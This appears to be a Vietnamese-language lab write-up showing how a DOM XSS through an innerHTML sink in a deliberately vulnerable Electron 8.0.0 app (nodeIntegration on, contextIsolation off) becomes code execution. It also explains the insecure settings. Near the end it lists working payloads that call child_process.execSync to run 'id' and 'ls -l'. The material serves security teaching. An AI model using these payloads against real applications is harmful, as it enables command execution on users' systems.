# RCE-to-XSS-Electron-8.0.0


Ứng dụng Electron 8.0.0 là một phiên bản cũ của Electron, được sử dụng để xây dựng các ứng dụng desktop chéo nền tảng (cross-platform) bằng công nghệ web như JavaScript, HTML và CSS. 

Mặc dù mang lại nhiều lợi ích bằng việc cho phép phát triển các ứng dụng desktop ngang hàng với web bằng JavaScript, HTML, và CSS, nhưng cũng tiềm ẩn rủi ro về bảo mật, cụ thể là lỗ hổng XSS đến RCE (Remote Code Execution).

Tổng quan : XSS to RCE

Setup 

  Sử dụng Electron 8.0.0 open source 
  
  URL Download : https://github.com/standardnotes/desktop/archive/v2.0.0.tar.gz
 
  Commands
```
wget https://github.com/standardnotes/desktop/archive/v2.0.0.tar.gz
tar xvfz v2.0.0.tar.gz
cd desktop-2.0.0/
npm audit
```
![1](https://github.com/Lilly-dox/Exploit-CVE-2023-22518/assets/130746941/47051781-9a54-4831-8142-e6b165d3b16c)

Chúng ta nhận được output :
```
npm ERR! code ENOLOCK
npm ERR! audit This command requires an existing lockfile.
npm ERR! audit Try creating one first with: npm i --package-lock-only
npm ERR! audit Original error: loadVirtual requires existing shrinkwrap file

npm ERR! A complete log of this run can be found in:
npm ERR!     /home/lilly-dox/.npm/_logs/2024-03-20T15_39_01_845Z-debug-0.log
```
Như lỗi trên hiển thị, chúng ta phải tạo tệp pack-lock.json, sử dụng lệnh được cung cấp trong báo lỗi để xử lý 
```
npm i --package-lock-only
```
sau đó chạy lại command :
```
npm audit
```
![2](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/cd2349ca-7629-42b6-bbe5-6d69c97d7425)

XSS to RCE
Download the first vulnerability file :
<file vulnerable1.zip>

File : 
vulnerable1/main.js
![3](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/4a7efd61-c551-4b04-9c42-72ebdbd4222f)

Như đã thấy :
1. `nodeIntegration` được bật (`nodeIntegration: true`)**:
    - Cài đặt này cho phép các quy trình kết xuất (tức là các trang web) tự do sử dụng API Node.js. Mặc dù việc kích hoạt tính năng này có thể thuận tiện cho các nhà phát triển nhưng nó làm tăng đáng kể rủi ro bảo mật. Nếu kẻ tấn công khai thác lỗ hổng XSS (Cross-Site Scripting) trong ứng dụng của bạn, chúng có thể sử dụng API Node.js để thực hiện các hành động độc hại trên hệ thống của người dùng, chẳng hạn như đọc/ghi tệp hoặc thực thi lệnh, dẫn đến Mã từ xa Lỗ hổng thực thi (RCE).
2. `contextIsolation` bị tắt (`contextIsolation: false`)**:
    - Cách ly bối cảnh là một tính năng bảo mật giúp tách bối cảnh JavaScript của trang được tải khỏi bối cảnh JavaScript của API Electron và tập lệnh tải trước. Bằng cách tắt tính năng này, bạn cho phép cả tập lệnh của trang và API Electron chia sẻ cùng một ngữ cảnh JavaScript. Lỗ hổng XSS trong trường hợp này có thể khiến kẻ tấn công xác định lại các nguyên mẫu tích hợp sẵn để giả mạo chức năng của ứng dụng hoặc giành quyền truy cập vào các API nhạy cảm.

File:
renderer.js
 ![4](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/fe5546a0-8657-437a-b3b6-1167166ac820)


 Nhận diện có innerHTML sink -> DOM XSS in innerHTML sink 

Khai thác :
 Dựng vulnerable1 lên để khai thác
 Commands:
 ```
 cd /path/to/vulnerable1
 npm install
 npm start
```
![5](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/0fde2e41-b063-472b-a976-925dadbc6806)

Sau khi start :

![6](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/4041753a-dbf7-4d33-b79c-6fdf1b70ca78)

Payloads :
```
test <img src=x onerror=alert("XSS")>
```
![7](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/57a12b6f-4691-46f8-8841-f3f067992d80)

```
<img src=x onerror="alert(require('child_process').execSync('id').toString());"> 
```
![8](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/901d21ef-5400-4c16-955f-d063213abd26)

```
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
```
![9](https://github.com/Lilly-dox/RCE-to-XSS-Electron-8.0.0/assets/130746941/e0859aa1-ac5e-4189-ad9f-77f706a640d1)




